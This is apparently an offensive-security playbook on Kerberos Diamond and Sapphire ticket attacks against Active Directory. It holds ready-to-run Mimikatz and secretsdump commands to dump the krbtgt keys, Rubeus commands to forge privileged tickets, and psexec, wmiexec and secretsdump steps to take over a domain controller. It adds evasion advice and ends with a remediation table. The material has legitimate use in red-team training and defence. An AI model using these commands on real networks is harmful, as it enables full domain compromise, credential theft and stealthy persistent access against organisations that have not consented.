# Diamond Ticket Attack

## What It Is

A Diamond Ticket is a technique that requests a **real, legitimate TGT from the DC**, then **modifies the PAC** (Privilege Attribute Certificate) to add elevated group memberships (Domain Admin, etc.).

**Why this matters:** Golden Tickets are forged entirely offline — the DC never issued them. Modern defenses like PAC validation and privilege level checking can detect Golden Tickets because the DC has no record of issuing them. A Diamond Ticket starts as a real ticket the DC issued, so it passes these validation checks.

**The PAC** is the section of a Kerberos ticket that lists the user's group memberships and privileges. It's encrypted and signed — but if you have the krbtgt key, you can re-sign any PAC you want.

---

## How It Works

1. Rubeus requests a real TGT for a valid domain user (requires their credentials or hash)
2. Rubeus decrypts the PAC using the krbtgt key
3. Rubeus modifies the PAC to add Domain Admin group membership (512) and Enterprise Admin (519)
4. Rubeus re-encrypts and re-signs the PAC with the krbtgt key
5. The result is a ticket the DC issued, with a valid DC signature, but with escalated privileges

**Why it bypasses detection:**
- DC issued the TGT → it appears in Kerberos logs as normal
- DC signature is valid → PAC validation passes
- The only anomaly is the group membership doesn't match AD — detectable by comparing ticket PAC against actual AD group membership

---

## What You Need

| Requirement | How to Get It |
|---|---|
| krbtgt AES256 key | `lsadump::dcsync /user:krbtgt` → `AES256 HMAC:` |
| Valid domain user credentials or hash | Any account you have access to — low privilege is fine |
| DC IP or hostname | From enumeration |
| Domain FQDN | `corp.local` |

**Important:** You need the krbtgt AES256 key, not just the NTLM hash. AES is required for the `/tgtdeleg` trick. Get both when you DCSync.

---

## Attack Steps

### Step 1 — Get the krbtgt Keys (Requires DA or DCSync Rights)

```sh
# From Linux
secretsdump.py corp.local/Administrator@dc01.corp.local -just-dc-user krbtgt

# From Windows — Mimikatz
lsadump::dcsync /user:krbtgt
```

From the output, grab:
- `Hash NTLM:` — the RC4/NTLM hash
- `AES256 HMAC:` — the AES256 key (needed for Diamond Ticket)

### Step 2 — Forge the Diamond Ticket

**With the user's plaintext password:**
```sh
.\Rubeus.exe diamond /tgtdeleg /ticketuser:jdoe /ticketuserpass:Password1 /enctype:aes /krbkey:<KRBTGT-AES256> /domain:corp.local /dc:<DC-IP> /ptt
```

**With the user's NTLM hash (no plaintext needed):**
```sh
.\Rubeus.exe diamond /tgtdeleg /ticketuser:jdoe /rc4:<USER-NTLM-HASH> /enctype:aes /krbkey:<KRBTGT-AES256> /domain:corp.local /dc:<DC-IP> /ptt
```

**With AES key (stealthiest — no RC4 on the wire):**
```sh
.\Rubeus.exe diamond /tgtdeleg /ticketuser:jdoe /aes256:<USER-AES256-KEY> /enctype:aes /krbkey:<KRBTGT-AES256> /domain:corp.local /dc:<DC-IP> /ptt
```

| Flag | Value | Notes |
|---|---|---|
| `/tgtdeleg` | — | Delegation trick — causes Rubeus to request a delegatable TGT |
| `/ticketuser:` | `jdoe` | Any valid domain user you have credentials for |
| `/ticketuserpass:` | `Password1` | Plaintext password — alternative to `/rc4:` |
| `/rc4:` | NTLM hash | Alternative to `/ticketuserpass:` |
| `/aes256:` | AES256 key | Stealthiest option — no RC4 auth on the wire |
| `/enctype:` | `aes` | Use `aes` — RC4 is legacy and monitored |
| `/krbkey:` | krbtgt AES256 key | Used to re-sign the modified PAC |
| `/domain:` | `corp.local` | Domain FQDN |
| `/dc:` | `10.10.0.5` | DC IP or hostname |
| `/ptt` | — | Inject into current session |

### Step 3 — Verify the Ticket

```sh
.\Rubeus.exe klist
# or
klist
```

Look for your ticket with the target user's name. The FQDN should be your domain.

### Step 4 — Use the Access

```sh
# Access DC file shares
dir \\dc01.corp.local\C$

# Run secretsdump with the injected ticket
secretsdump.py -k -no-pass dc01.corp.local

# WMI execution
wmiexec.py -k -no-pass dc01.corp.local

# Or spawn a shell
psexec.py -k -no-pass dc01.corp.local
```

---

## Ticket Comparison

| | Golden | Silver | Diamond | Sapphire |
|---|---|---|---|---|
| **DC issued it?** | No | No | Yes | Yes |
| **Valid DC signature?** | No (forged) | No (forged) | Yes | Yes |
| **PAC matches AD?** | No | No | No | Yes (copied from real DA) |
| **Detectability** | Medium | Low (no DC logs) | Low | Very Low |
| **Requires** | krbtgt hash | Service acct hash | krbtgt AES + valid creds | krbtgt AES + real DA exists |
| **Scope** | Domain-wide | One service | Domain-wide | Domain-wide |

---

## When to Use Diamond Over Golden

- **Environments with PAC validation enabled** — Golden Tickets fail validation; Diamond passes
- **Environments monitoring for unusual ticket lifetimes** — Diamond tickets have normal lifetimes since the DC issued them
- **When you want less noisy persistence** — the base TGT looks legitimate in DC logs
- **Post-compromise persistence** — after you've already done DCSync, use Diamond for ongoing access rather than Golden

---

## Sapphire Ticket (Brief)

Sapphire extends Diamond by copying the entire PAC from an actual DA's ticket rather than constructing a PAC from scratch. This means the group memberships are identical to a real DA — indistinguishable from legitimate DA activity even if defenders compare the PAC against AD.

```sh
.\Rubeus.exe sapphire /target:<DA-USERNAME> /enctype:aes /krbkey:<KRBTGT-AES256> /domain:corp.local /dc:<DC-IP> /ptt
```

Requires that a DA is logged in somewhere you can access (to get their ticket), or you can specify a DA username and Rubeus will request a service ticket for that user.

---

## Remediation

| Control | What it does |
|---|---|
| **Double krbtgt reset** | Rotate krbtgt password twice, 10+ hours apart (tickets have 10-hour default lifetime — single reset doesn't immediately invalidate all outstanding tickets). Script: `Reset-KrbtgtKeyInteractiveLogon` or manual AD Users & Computers. |
| **Monitor event ID 4769 anomalies** | TGS requests from accounts with unusual group memberships — requires correlation between ticket PAC and actual AD group membership at time of request. SIEM rule: 4769 where ticket claims Domain Admin but account isn't in Domain Admins group. |
| **Monitor event ID 4768 → 4769 correlation** | Diamond Tickets will show 4768 (TGT request) followed by 4769. Golden Tickets show 4769 without 4768. This detection works for Golden but not Diamond — Diamond looks normal. |
| **Privileged Access Workstations (PAW)** | Limits where DA credentials can be used — reduces the blast radius if krbtgt is compromised. |
| **Tiered administration model** | Prevents DA credentials from touching Tier 1/2 systems — limits krbtgt exposure to DC-only operations. |
| **Audit DCSync rights** | `DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-All` should only be on DCs. Monitoring 4662 events for these rights shows who is DCSync-ing. |
| **Microsoft ATA / Defender for Identity** | Can detect anomalous Kerberos PAC modifications — specific detection for Diamond/Sapphire Tickets in newer versions. |
